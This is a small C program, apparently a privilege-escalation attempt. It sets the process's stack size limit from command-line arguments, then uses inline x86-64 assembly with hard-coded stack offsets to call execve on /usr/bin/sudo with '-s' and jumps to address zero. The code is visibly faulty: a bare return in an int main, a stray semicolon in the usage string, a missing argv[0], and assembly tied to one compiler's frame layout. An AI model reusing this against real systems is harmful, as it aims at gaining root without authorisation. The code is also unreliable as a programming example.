#define _GNU_SOURCE
#define _FILE_OFFSET_BITS 64
#include <stdio.h>
#include <stdlib.h>
#include <sys/resource.h>
#include <time.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
    struct rlimit old, new;
    struct rlimit *newp = NULL;
    pid_t pid;
    char *cmd = "/usr/bin/sudo";
    char *argv_[] = {"-s", NULL};
    char *envp_[] = {NULL};

    if (argc != 3) {
        printf("usage: soflimit hardlimit\n;");
        return;
    }

    pid = getpid();
    newp = NULL;
    if (argc == 3) {
        new.rlim_cur = atoi(argv[1]);
        new.rlim_max = atoi(argv[2]);
        newp = &new;
    }

    if (prlimit(pid, RLIMIT_STACK, newp, &old) == -1) {
        perror("limit failed");
        exit(EXIT_FAILURE);
    }

    // rax = syscall nº
    // 1.rdi	2.rsi	3.rdx
    __asm__(
        "mov   -0x58(%rbp),%rax\n\t"
        "mov    %rax,%rdi\n\t"
        "lea -0x20(%rbp),%rcx\n\t"
        "mov    %rcx, %rsi\n\t"
        "lea        -0x28(%rbp),%rdx\n\t"
        "mov    $0x3b,%eax\n\t"
        "syscall\n\t"
        "mov $0x0, %eax\n\t"
        "jmp %rax\n\t");
}
